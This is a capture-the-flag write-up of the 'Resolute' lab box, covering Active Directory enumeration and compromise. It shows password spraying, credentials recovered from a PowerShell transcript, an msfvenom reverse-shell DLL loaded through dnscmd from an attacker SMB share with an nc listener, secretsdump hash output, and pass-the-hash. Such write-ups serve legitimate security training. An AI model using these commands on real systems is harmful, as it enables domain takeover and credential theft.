# Resolute - OSCP boxe

![Untitled](Resolute%20-%20OSCP%20boxe%2006ca063ca340410b8f1813f56e15e38c/Untitled.png)

## **Scanning :**

Nmap scan to see open ports and services : 

```python
> nmap 10.10.10.169 -sC -sV -Pn -T4

53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-03-16 09:22:29Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m11s, deviation: 4h02m30s, median: 7m10s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-03-16T09:22:34
|_  start_date: 2024-03-16T09:19:30
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2024-03-16T02:22:32-07:00

```

Its was a domain controleur so lets add the domaine, the FQDN and the ip to your /etc/hosts file. 

```python
echo "10.10.10.169 megabank.local RESOLUTE.megabank.local" >> /etc/hosts
```

## **Enumerat SMB :**

Lets try to connect on the smb service using nul creds or null session. 

```python
> crackmapexec smb 10.10.10.169 -u '' -p '' 
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\: 
```

Lets try to enumerate users in the domain. 

```python
> crackmapexec smb 10.10.10.169 -u '' -p '' --users

[*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\: 
SMB         10.10.10.169    445    RESOLUTE         [*] Trying to dump local users with SAMRPC protocol
SMB         10.10.10.169    445    RESOLUTE         [+] Enumerated domain user(s)
SMB         10.10.10.169    445    RESOLUTE         megabank.local\Administrator                  Built-in account for administering the computer/domain
SMB         10.10.10.169    445    RESOLUTE         megabank.local\Guest                          Built-in account for guest access to the computer/domain
SMB         10.10.10.169    445    RESOLUTE         megabank.local\krbtgt                         Key Distribution Center Service Account
SMB         10.10.10.169    445    RESOLUTE         megabank.local\DefaultAccount                 A user account managed by the system.
SMB         10.10.10.169    445    RESOLUTE         megabank.local\ryan                           
SMB         10.10.10.169    445    RESOLUTE         megabank.local\marko                          Account created. Password set to Welcome123!
SMB         10.10.10.169    445    RESOLUTE         megabank.local\sunita                         
SMB         10.10.10.169    445    RESOLUTE         megabank.local\abigail                        
SMB         10.10.10.169    445    RESOLUTE         megabank.local\marcus                         
SMB         10.10.10.169    445    RESOLUTE         megabank.local\sally                          
SMB         10.10.10.169    445    RESOLUTE         megabank.local\fred                           
SMB         10.10.10.169    445    RESOLUTE         megabank.local\angela                         
SMB         10.10.10.169    445    RESOLUTE         megabank.local\felicia                        
SMB         10.10.10.169    445    RESOLUTE         megabank.local\gustavo                        
SMB         10.10.10.169    445    RESOLUTE         megabank.local\ulf                            
SMB         10.10.10.169    445    RESOLUTE         megabank.local\stevie                         
SMB         10.10.10.169    445    RESOLUTE         megabank.local\claire                         
SMB         10.10.10.169    445    RESOLUTE         megabank.local\paulo                          
SMB         10.10.10.169    445    RESOLUTE         megabank.local\steve                          
SMB         10.10.10.169    445    RESOLUTE         megabank.local\annette                        
SMB         10.10.10.169    445    RESOLUTE         megabank.local\annika                         
SMB         10.10.10.169    445    RESOLUTE         megabank.local\per                            
SMB         10.10.10.169    445    RESOLUTE         megabank.local\claude                         
SMB         10.10.10.169    445    RESOLUTE         megabank.local\melanie                        
SMB         10.10.10.169    445    RESOLUTE         megabank.local\zach                           
SMB         10.10.10.169    445    RESOLUTE         megabank.local\simon                          
SMB         10.10.10.169    445    RESOLUTE         megabank.local\naoki 
```

We get a potential password in the commentaire of the domain user **marko,** now we can create a liste of the users and try password spraying with all of it. 

my user list : 

```python
Administrator                  
Guest                          
krbtgt                         
DefaultAccount                
ryan                           
marko                         
sunita                         
abigail                        
marcus                         
sally                          
fred                           
angela                         
felicia                        
gustavo                        
ulf                            
stevie                         
claire                         
paulo                          
steve                          
annette                        
annika                         
per                            
claude                         
melanie                        
zach                           
simon                          
naoki 
```

Launch password spraying. 

```python
> crackmapexec smb 10.10.10.169 -u user.lst -p pass.txt --continue-on-succes | grep '[+]'
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 

```

We get user and password so it was the first acces on the domaine. 

## Find the way using bloodhound :

collect ldap informations : 

```python
> rusthound -d megabank.local -i 10.10.10.169 -u "melanie"@'megabank.local' -p 'Welcome123!'
```

as you can see melanie is part of group Remote Management users so we can open a shell with evil-winrm because this user is abel to administrate the DC with winrm remotly. 

![Untitled](Resolute%20-%20OSCP%20boxe%2006ca063ca340410b8f1813f56e15e38c/Untitled%201.png)

connect with winrm. 

```python
> evil-winrm -i 10.10.10.169 -u 'melanie' -p 'Welcome123!'
```

Get users .txt on the Desktop of melanie. 

After enumeration with bloodhound i found this way. 

![Untitled](Resolute%20-%20OSCP%20boxe%2006ca063ca340410b8f1813f56e15e38c/Untitled%202.png)

and contractor is part of group DNSAdmins like you can see ( in this case i use [ADpeas](https://github.com/61106960/adPEAS). )  

![Untitled](Resolute%20-%20OSCP%20boxe%2006ca063ca340410b8f1813f56e15e38c/Untitled%203.png)

In my opignon we need to compris DNSadmin to get DA. 

[Security groups | The Hacker Recipes](https://www.thehacker.recipes/a-d/movement/domain-settings/builtin-groups)

## **Melanie to Ryan :**

After lot of enumeration i found this directory. 

![Untitled](Resolute%20-%20OSCP%20boxe%2006ca063ca340410b8f1813f56e15e38c/Untitled%204.png)

And on this directory there is another directory and on these direcotry there is a file. 

```python
> cd PSTranscripts
> gci -Hidden

    Directory: C:\PSTranscripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203

> cd 20191203
> gci -Hidden

    Directory: C:\PSTranscripts\20191203

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

```

so downlpad the file lets analyse it localy. 

it looks like a powershell command history and bimgo in this script we find the password of domain user ryan

```powershell
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
```

lets valid it with cme. 

```powershell
> crackmapexec smb 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!'                       
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (admin)
```

CME see ryan is admin lets try to dump some hashes. 

```powershell
> crackmapexec smb 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!' --sam
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (admin)
SMB         10.10.10.169    445    RESOLUTE         [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
```

but we can not do this, we need to exploit DNSadmin group. 

## **Ryan to Domain Admin :**

use evil-winrm to auth with ryan. 

```bash
> evil-winrm -i 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!'
```

First we need to create a malicious DLL with msfvenom. that we will be injecting into a dns.exe process on a victim DNS server (DC). 

```bash
msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll LHOST=10.10.14.9 LPORT=1337 > dns.dll
```

now use this command to tell to DC to load my dll when the service start. 

```powershell
> dnscmd.exe RESOLUTE /config /serverlevelplugindll \\10.10.14.9\share\dns.dll
```

If we have change succefully registry value `ServerLevelPluginDll` points to our malicious DLL : 

```powershell
> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
```

Now stop and restart the service to get the SYSTEM SHELL. 

```bash
# start listener 
> nc -lvp 1337

# start smbserver 
> impacket-smbserver share .

# start and stop dns service
> sc.exe stop dns
> sc.exe start dns
```

![Untitled](Resolute%20-%20OSCP%20boxe%2006ca063ca340410b8f1813f56e15e38c/Untitled%205.png)

We get the shell, we can now add ryan to group administrators and dump domain hashes

```powershell
> net localgroup Administrators ryan /add
```

dump hash.

```powershell
> secretsdump megabank.local/ryan:'Serv3r4Admin4cc123!'@10.10.10.169

Administrator:500:aad3b435b51404eeaad3b435b51404ee:fb3b106896cdaa8a08072775fbd9afe9:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:49a9276d51927d3cd34a8ac69ae39c40:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
megabank.local\ryan:1105:aad3b435b51404eeaad3b435b51404ee:3f653cb103e005246bc95ceb2f56e30b:::
megabank.local\marko:1111:aad3b435b51404eeaad3b435b51404ee:8276510304cefe6e77c3a9e910ba3a6a:::
megabank.local\sunita:6601:aad3b435b51404eeaad3b435b51404ee:4e67de165ebd5e604d6580b15cfc61b2:::
megabank.local\abigail:6602:aad3b435b51404eeaad3b435b51404ee:3f67ccb851b02ac4ee9f91eeddf1cac7:::
megabank.local\marcus:6603:aad3b435b51404eeaad3b435b51404ee:d546df40747f48ece7e2be7349ec8f1b:::
megabank.local\sally:6604:aad3b435b51404eeaad3b435b51404ee:9d5a37664c09e08e8be59ca3e76c262f:::
megabank.local\fred:6605:aad3b435b51404eeaad3b435b51404ee:7be0fca1b4aec94356b86e4b1de06c4f:::
megabank.local\angela:6606:aad3b435b51404eeaad3b435b51404ee:07fe48603fa7ada83e62d14e54f45127:::
megabank.local\felicia:6607:aad3b435b51404eeaad3b435b51404ee:74dce6edc0eabd905d42e0a7225b80f3:::
megabank.local\gustavo:6608:aad3b435b51404eeaad3b435b51404ee:0b03061f9b79bf6642fe92aee0a109c6:::
megabank.local\ulf:6609:aad3b435b51404eeaad3b435b51404ee:f3dfd5c45de7a953c82fbe99749057c2:::
megabank.local\stevie:6610:aad3b435b51404eeaad3b435b51404ee:eb41b7464f302e573aaa697d191b5569:::
megabank.local\claire:6611:aad3b435b51404eeaad3b435b51404ee:72dc9d1d791307cf5217c8e39a88f56a:::
megabank.local\paulo:6612:aad3b435b51404eeaad3b435b51404ee:4e2d8cc79e15e601c099170a645483e6:::
megabank.local\steve:6613:aad3b435b51404eeaad3b435b51404ee:b8de802a1e7862c6e0e19be9c2baff0f:::
megabank.local\annette:6614:aad3b435b51404eeaad3b435b51404ee:2f9b8f25ec94dd46ecb071c27dc82905:::
megabank.local\annika:6615:aad3b435b51404eeaad3b435b51404ee:5d7226ebae151a224ada8add01bdc21c:::
megabank.local\per:6616:aad3b435b51404eeaad3b435b51404ee:b66616eb72209b81edded1fe63ae8806:::
megabank.local\claude:6617:aad3b435b51404eeaad3b435b51404ee:f059af81cb6022dc5de6389d4a6e6a65:::
megabank.local\melanie:10101:aad3b435b51404eeaad3b435b51404ee:e4a22d8e7bbec871b341c88c2e94cba2:::
megabank.local\zach:10102:aad3b435b51404eeaad3b435b51404ee:434927d08ddb971a8b14e407a58f6e9e:::
megabank.local\simon:10103:aad3b435b51404eeaad3b435b51404ee:25bc108c637a551f8b000054ea8ddc6e:::
megabank.local\naoki:10104:aad3b435b51404eeaad3b435b51404ee:07a1070c03b1a26e53d265d27ecb1a38:::
RESOLUTE$:1000:aad3b435b51404eeaad3b435b51404ee:bd0c6f595fb4c21bab7d150c487183ed:::
MS02$:1104:aad3b435b51404eeaad3b435b51404ee:7b71dcfa93cf1f5d37d34497b632c890:::

```

connect with admin hash and get the flag. 

```powershell
> crackmapexec smb 10.10.10.169 -u 'administrator' -H fb3b106896cdaa8a08072775fbd9afe9 -x 'more C:\Users\Administrator\Desktop\root.txt'
```

### **Credits :**

Escalate to DA from DNSAdmins : 

[Escalating Privileges with DNSAdmins Group — Active Directory](https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b)

malicious dll with msfvenom : 

[Meterpreter shell as a 32 & 64 Bit DLL](https://medium.com/securebit/meterpreter-shell-as-a-32-64-bit-dll-2520604e41f6)